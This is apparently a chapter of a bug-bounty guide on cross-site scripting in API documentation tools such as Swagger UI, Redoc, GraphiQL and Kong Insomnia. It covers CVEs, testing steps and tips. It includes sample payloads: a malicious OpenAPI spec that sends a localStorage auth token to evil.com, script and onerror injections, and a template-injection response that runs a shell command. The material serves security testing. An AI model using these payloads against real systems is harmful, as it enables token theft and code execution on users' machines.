# 64 - API Documentation Tool XSS

## Overview

API documentation and testing tools introduce XSS through:
- Swagger UI DOM XSS via outdated DOMPurify (versions 3.14.1-3.38.0)
- OpenAPI spec injection (descriptions, examples, schemas, OAuth URLs)
- GraphiQL reflected XSS via query parameter escaping failures
- Redoc markdown rendering with unsanitized content
- Kong Insomnia template injection leading to RCE (CVE-2025-1087)
- API playground collection/workspace poisoning

## Swagger UI DOM XSS (3.14.1-3.38.0)

Swagger UI has a long history of XSS vulnerabilities. The most impactful recent flaw uses an outdated DOMPurify library (2.2.2) combined with remote spec loading.

### Remote Spec Loading XSS

A victim copies a URL to a YAML/JSON API definition file containing a malicious payload and loads it in Swagger UI. Researchers reported more than 60 instances across bug bounty programs.

```json
// Malicious OpenAPI spec served from attacker URL
{
  "openapi": "3.0.0",
  "info": {
    "title": "Malicious API",
    "description": "<img src=x onerror='fetch(`https://evil.com/steal?token=${localStorage.getItem(\"authToken\")}`)'>"
  }
}
// Load via: https://target.com/swagger/?url=https://evil.com/malicious-spec.json
```

### DOMPurify Bypass (CVE-2024-45801)

**CVE-2024-45801:** Malicious nested HTML can bypass depth checking in DOMPurify. Fixed in DOMPurify 2.5.4 and 3.1.3. Swagger UI versions bundling affected DOMPurify are transitively vulnerable.

### Query Parameter Disabling (GHSA-qrmm-w75w-3wpx)

The maintainers disabled query parameters by default starting in version 4.1.3 to prevent phishing via remote spec loading.

### Historical Swagger UI XSS Vectors

- **Before 3.20.9:** Unsanitized URLs in OAuth authentication flow (GHSA-4f9m-pxwh-68hg)
- **Before 2.2.1:** Unsanitized HTML in `apiInfo` description fields (GHSA-w992-2gmj-9xxj)
- **Before 2.2.1:** Unsanitized JSON schema method descriptions (GHSA-vp93-gcx5-4w52)
- **Before 3.4.2:** `javascript:` and `data:` URLs from user-influenced href fields

### OpenAPI Spec Injection Vectors

Attack surfaces within the OpenAPI specification:
1. **Description fields** with embedded HTML/JavaScript
2. **Example values** rendered without sanitization
3. **Parameter default values** populating the TryItOut panel
4. **Schema descriptions** rendered in documentation views

```yaml
# Malicious OpenAPI spec injection points
info:
  description: "<script>alert(1)</script>"
paths:
  /users:
    get:
      parameters:
        - name: q
          schema:
            type: string
            default: "<img src=x onerror=alert(1)>"
          description: "<a href='javascript:alert(1)'>Click</a>"
```

### Gotify Swagger UI XSS (GHSA-qrmm-w75w-3wpx)

Gotify's bundled Swagger UI was vulnerable to rendering XSS via CVE-2020-26870. Fixed in Gotify 2.2.3.

### Token Storage Risk

Jamf Pro's Classic API Swagger UI stores the authentication token in localStorage under `authToken`, making it a target for XSS.

## Redoc XSS

No Redoc-specific XSS advisory was found from 2024-2026. However, the underlying Markdown rendering libraries have had vulnerabilities:

**CVE-2025-7969 (markdown-it 14.1.0):** Reflected XSS when custom highlight functions are used. Maintainers do not consider this a vulnerability.

**CVE-2025-24981 (@nuxtjs/mdc):** Bypass of `javascript:` URL filter using hex-encoded HTML entities. Fixed in 0.13.3.

**CVE-2025-54075 (@nuxtjs/mdc):** Stored XSS where a Markdown author can inject a `<base>` element, redirecting all relative URLs on the page. Fixed in 0.17.2.

Redoc renders OpenAPI descriptions as Markdown/HTML. Any deployment using vulnerable Markdown parsing libraries is potentially exposed.

## GraphiQL XSS

### Query Parameter Backslash Bypass (CVE-2026-42794)

**CVE-2026-42794:** Reflected XSS where the escaping routine fails to escape backslashes when it escapes single quotes and newlines. The attacker uses `\'` sequences to neutralize quote escaping and break out of a string context. Affects versions 1.2.0+. CVSS 2.3.

### Introspection Schema Injection (CVE-2021-41248)

All versions before 1.4.7 were vulnerable to XSS through malicious schema introspection responses or crafted type names. Still affecting IBM watsonx.data 2.3 in April 2026.

### GraphQL Playground Endpoint XSS (CVE-2021-41249)

The `endpoint` query parameter allows loading a malicious schema URL directly. Fixed in graphql-playground-react 1.7.28.

## Kong Insomnia RCE (CVE-2025-1087)

**CVE-2025-1087:** Critical template injection vulnerability (CVSS 9.8) in Insomnia Desktop Application before version 11.0.2. The flaw allows attackers to execute arbitrary code through malicious API responses, imports, or cookies due to improper input validation of template strings.

```javascript
// Attack vector: Malicious API response with template injection
// Insomnia evaluates template strings like {{ response.body.token }}
// in environment variables, request bodies, and headers

// When a malicious API server responds:
HTTP/1.1 200 OK
Content-Type: application/json

{"token": "{{ require('child_process').exec('id') }}"}

// If Insomnia processes this response through its template engine,
// the Node.js code executes on the user's machine
```

One researcher claims the fix was bypassed and the issue remains exploitable in version 11.2.0 via cookies, imports, and other vectors.

### Electron-Based API Client Risks

Sonar's "Scripting Outside the Box" research covers security risks in Electron-based API clients (Postman, Insomnia, Bruno, Hoppscotch). Disabled security features like `nodeIntegration` and `contextIsolation` expand the impact of XSS from DOM-level to full system access.

### Collection/Workspace Poisoning

Collection/workspace sharing (via Git, export files, or team sync) is the primary delivery mechanism for poisoned configurations. A malicious collection file could contain template injection payloads in environment variables, request URLs, or headers.

## API Playground Injection

API playgrounds and documentation pages are high-value XSS targets because:
1. They frequently store authentication credentials
2. They are often left accessible in production
3. They render user-provided API specifications

An exposed swagger.json gives an attacker a complete map of every endpoint, parameter, and expected data format.

## Testing Methodology

1. **Check Swagger UI version** -- versions 3.14.1-3.38.0 are vulnerable via DOMPurify
2. **Test remote spec loading** via `?url=` and `?configURL=` parameters
3. **Check query parameter support** -- is it disabled (v4.1.3+)?
4. **Test GraphiQL** with backslash-based escaping bypasses
5. **Inspect OpenAPI specs** for description and example injection points
6. **Check Redoc** for markdown rendering vulnerabilities
7. **Test API clients** (Insomnia, Postman) with malicious API responses
8. **Check production exposure** of API documentation endpoints
9. **Inspect localStorage** for stored auth tokens on documentation pages

## Bug Bounty Tips

1. Swagger UI XSS has been found 60+ times across bug bounty programs
2. Kong Insomnia CVE-2025-1087 is CVSS 9.8 and may still be exploitable post-patch
3. GraphiQL introspection XSS from 2021 still affects enterprise deployments in 2026
4. API documentation pages often store auth tokens in localStorage
5. The TryItOut panel populates from spec defaults -- check for injection in default values
6. Postman has a sandboxed scripting model; Insomnia's template system has less isolation
7. Exposed swagger.json provides a complete API attack map
8. No Redoc-specific CVE exists, but underlying markdown-it vulnerabilities apply
